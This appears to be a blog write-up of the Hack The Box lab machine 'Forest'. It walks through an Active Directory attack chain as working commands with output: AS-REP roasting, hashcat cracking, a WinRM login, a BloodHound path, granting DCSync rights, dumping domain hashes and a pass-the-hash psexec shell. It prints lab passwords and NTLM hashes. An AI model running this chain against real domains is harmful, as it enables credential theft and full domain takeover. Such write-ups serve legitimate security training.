+<p>When it comes to an Active Directory, I often to see people begin their enumeration from SMB (445) and sometimes LDAP (389). I&rsquo;ll also follow that sequence because these three ports most likely to have anonymous login.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
+<p>I can authenticate myself as anonymous/null session using both <code>smbclient</code> and <code>rppclient</code>. With current access I could get list of users and groups but not to file shares.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+$ rpcclient -U <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#e6db74">&#39;10.10.10.161&#39;</span>
+rpcclient $&gt;
+rpcclient $&gt; enumdomusers
+user:<span style="color:#f92672">[</span>Administrator<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f4<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>DefaultAccount<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f7<span style="color:#f92672">]</span>
+...&lt;snip&gt;...
+user:<span style="color:#f92672">[</span>sebastien<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x479<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>lucinda<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47a<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>svc-alfresco<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47b<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>andy<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47e<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>mark<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47f<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>santi<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x480<span style="color:#f92672">]</span>
+</code></pre></div><p>I use this blog post from <a href="https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/">SANS</a> as my reference.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-svc-alfresco">Shell as svc-alfresco</h3>
+<h4 id="asrep-roasting">ASREP Roasting</h4>
+<p>In Active Directory, if there&rsquo;s a user, that by any chance, has its Kerberos pre-authentication disabled, then we can use a tool from Impacket called <code>GetNPUsers.py</code> to obtain the user&rsquo;s <em>ticket-granting-ticket</em> (TGT).</p>
+<p>When using Kerberos as an authentication protocol and the pre-auth is enabled, the client or user must provide a timestamp encrypted with their password hash for each request they send (KRB_AS_REQ). If the server reads a valid time from the request, it returns the user&rsquo;s TGT along with Session Key encrypted with the user&rsquo;s password hash (KRB_AS_REP).</p>
+<p>With preauth disabled, the user doesn&rsquo;t need to provide the timestamp. The server only validates them based on their usernames. Therefore, an attacker can send a replay attack/dummy request to obtain the TGT and brute force it offline (read more about it <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">here</a>)</p>
+<p>Below is the overview of the Kerberos mechanism. The red circle is where the AS-REP roasting attack happened.</p>
+<center>
+<p><div class="img-container"><img src="imgs/55e839a7e034457a922add499992970d.png" alt="1c8adf13109de9cc575c53d4eb659467.png"  /></div>
+</p>
+<p><small>Taken from &ldquo;Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System&rdquo; by David Freimanis</small></p>
+</center>
+<p><code>GetNPUsers.py</code> initiates a dummy request to Forest DC and successfully captures a TGT belongs to <code>svc-alfresco</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+$ GetNPUsers.py -dc-ip <span style="color:#e6db74">&#39;10.10.10.171&#39;</span> -request htb.local/  -usersfile users -format
+Impacket v0.9.20 - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon
+      UAC
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN<span style="color:#f92672">=</span>Service Accounts,OU<span style="color:#f92672">=</span>Security Groups,DC<span style="color:#f92672">=</span>htb,DC<span style="color:#f92672">=</span>local  2020-03-26 09:40:41.035829  2020-03-26 09:41:40.077493  0x410200
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7$ea7045cfe9b7583ebd9ba81934cf51330863f66e8b3c2c542981f6317b851980eae4e1a23048e95003cfb38c692075cabf9e3da009e3b1a0e17a34f6fd5d27aa1869a458faee9eff4bdbf5f5f3aaf826caf7e0326f52a522b630becd8f636b8b2fd11af194a18e86d07ad8a55299739684d8be527a9e75e16480db5177841cc7f54ab98891d1691b6ab7f4cbc576d0036820a6c3e59aeaee32e88628c88929e522af9b98ce169ea3bc369551a2925c76bd64e13a7a312119552dad92e9a43814e9033c5ad7d4d4c9808a968ebcc269a52e1f458a4d98c5d930068c52d15c5385c2d71f90933a
+</code></pre></div><h4 id="cracking-tgt">Cracking TGT</h4>
+<p>A Dictionary attack using <code>hashcat</code> successfully cracked the TGT and revealed the password of <code>svc-alfresco</code></p>
+<pre><code>hashcat64.exe -m 18200 svcalfresco.txt rockyou.txt -O
+</code></pre><p><div class="img-container"><img src="imgs/54b3a7dbe1c644a98c00a8458e2723ff.png" alt="3fa7dc6810434503007549f8610016fa.png"  /></div>
+</p>
+<p>The password is <code>s3rvice</code>.</p>
+<h4 id="remote-login---evil-winrm">Remote login - Evil-WinRM</h4>
+<p>User <code>svc-alfresco</code> can login remotely via WinRM using <code>evil-winrm</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+$ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.161&#39;</span> -u svc-alfresco -p s3rvice
+</code></pre></div><p>User flag is done here.</p>
+<center>
+<p><div class="img-container"><img src="imgs/image-20210405164859538.png" alt="image-20210405164859538"  /></div>
+</p>
+</center>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
+<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
+<p>After days, I couldn’t find a vulnerable application or services on this machine (this is prior to ZeroLogon), so I’ll use BloodHound to collect more information about object relationships within this Active Directory.</p>
+<p>First, I’ll host my own shares using <code>smbserver.py</code> from Impacket. This will make it easier to exfil and clean up data.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+$ mkdir shares; cd shares/
+→ root@iamf «shares» «10.10.14.116»
+$ smbserver.py myfj . -smb2support -username iamf -password iamf
+</code></pre></div><p>On Forest, I’ll use my share as a network drive.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\&gt; $pass = ConvertTo-SecureString <span style="color:#e6db74">&#39;belompi&#39;</span> -AsPlainText -Force
+*Evil-WinRM* PS C:\&gt;
+*Evil-WinRM* PS C:\&gt; $cred = New-Object System.management.automation.pscredential(<span style="color:#e6db74">&#39;mikun&#39;</span>, $pass)
+*Evil-WinRM* PS C:\&gt;
+*Evil-WinRM* PS C:\&gt; New-PSDrive -Name mikun -PSProvider FileSystem -Credential $cred -Root \\<span style="color:#66d9ef">[tun0ip]</span>\myfj
+*Evil-WinRM* PS C:\&gt; 
+*Evil-WinRM* PS C:\&gt; cd mikun<span style="color:#960050;background-color:#1e0010">:</span>
+</code></pre></div><p>I&rsquo;ve already copied <code>SharpHound.exe</code>, the BloodHound ingestor, to my shares.</p>
+<center>
+<p><div class="img-container"><img src="imgs/80def241b823454fa383ea4c1caabc48.png" alt="4da2b821c626eeaa85eecea39b4c96d7.png"  /></div>
+</p>
+</center>
+<p>I’ll start collecting with <code>-c all</code> option to collect all.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; .\SharpHound.exe -c all
+</code></pre></div><p><div class="img-container"><img src="imgs/acfc9f4b0e234e03824e901be6c9bae0.png" alt="79cb63de9a27f691e28d80820db1ad3d.png"  /></div>
+</p>
+<p>After it finishes, I’ll start the BloodHound GUI and then load the collected data by drag and drop.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+$ neo4j console &amp;
+
+→ root@iamf «forest» «10.10.14.116»
+$ bloodhound --no-sandbox &amp;
+</code></pre></div><p>I marked <code>svc-alfresco</code> as ‘owned’ then used BloodHound pre-built analytics queries to find the shortest path from <code>svc-alfresco</code> to domain admin. The prebuilt query name is “Shortest Path from Owned Principal”.</p>
+<p><div class="img-container"><img src="imgs/2506f5fa02894bd2b3d1095de0c87dcb.png" alt="210d3c3d6e83c6abadd56212b588b7b0.png"  /></div>
+</p>
+<p>Path explanation, from top (nearest path to domain admin) to the bottom:</p>
+<ul>
+<li><code>Exchange Windows Permissions</code> group has <code>WriteDacl</code> permission on AD domain. It simply allows you to <strong>modify the domain object’s permissions</strong>. Users, groups, computers, shares are domain objects.</li>
+<li><code>Account Operators</code> group has <code>GenericAll</code> permissions on <code>Exchange Windows Permissions</code> group. It allows you to <strong>modify group membership</strong> like adding/removing a user to/from the group. <code>Account Operators</code> members have the ability to <strong>create a user</strong>.</li>
+<li><code>Privileged IT Accounts</code> group has direct membership to the <code>Account Operators</code> group.</li>
+<li>User <code>svc-alfresco</code> is a direct member of <code>Service Account</code> group and it has indirect membership to the <code>Privileged IT Accounts</code> and the <code>Account Operators</code> group</li>
+</ul>
+<p>Based on the path, here is the plan:</p>
+<ul>
+<li>Leverage <code>Account Operators</code> indirect membership to create a new user and join it to <code>Exchange Windows Permission</code> group</li>
+<li>Leverage <code>Exchange Windows Permissions</code> group permission to grant <code>DS-Replication-Get-Changes-All</code> (DCSync) to the new user.</li>
+</ul>
+<h4 id="credential-dumping-dcsync-rights">Credential Dumping DCSync rights</h4>
+<p>In Forest, I&rsquo;ll have to load <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView.ps1</a> first.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; Import-Module .\powerview.ps1
+</code></pre></div><p>Then I&rsquo;ll create a new user and join it to the <code>Exchange Windows Permissions</code> group.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; net user mikun password /add /domain
+*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; 
+*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; net group <span style="color:#e6db74">&#34;Exchange Windows Permission&#34;</span> /add mikun
+</code></pre></div><p>After that, grant it DCSync rights</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; $pass = ConvertTo-SecureString <span style="color:#e6db74">&#39;password&#39;</span> -AsPlainText -Force
+*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt;
+*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; $cred = New-Object System.management.automation.pscredential(<span style="color:#e6db74">&#39;mikun&#39;</span>, $pass)
+*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt;
+*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; Add-DomainObjectAcl -Credential $cred -TargetIdentity <span style="color:#e6db74">&#34;DC=htb, DC=local&#34;</span> -PrincipalIdentity mikun -Rights DCSync
+</code></pre></div><p>Now I can use <code>secretsdump.py</code> from Impacket with that user to perform a DCSync attack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+$ secretsdump.py htb.local/mikun:<span style="color:#e6db74">&#39;password&#39;</span>@10.10.10.161
+Impacket v0.9.20 - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local<span style="color:#ae81ff">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+.... &lt;snip&gt; ....
+htb.local<span style="color:#ae81ff">\s</span>ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local<span style="color:#ae81ff">\l</span>ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local<span style="color:#ae81ff">\s</span>vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local<span style="color:#ae81ff">\a</span>ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local<span style="color:#ae81ff">\m</span>ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local<span style="color:#ae81ff">\s</span>anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+.... &lt;snip&gt; ....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
+</code></pre></div><h4 id="pass-the-hash-with-psexecpy">Pass the Hash with psexec.py</h4>
+<p>Administrator hash can be used with <code>psexec.py</code> from Impacket to gain shell access (pass-the-hash).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+$ psexec.py -hashes <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6&#39;</span> administrator@10.10.10.161
+</code></pre></div><p><div class="img-container"><img src="imgs/5a2108e444d24cdaa30025943db72b72.png" alt="f5aa475536c65192d37a0278a77646ee.png"  /></div>
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/">https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/</a></li>
+<li><a href="https://www.diva-portal.org/smash/get/diva2:1358429/FULLTEXT01.pdf">https://www.diva-portal.org/smash/get/diva2:1358429/FULLTEXT01.pdf</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
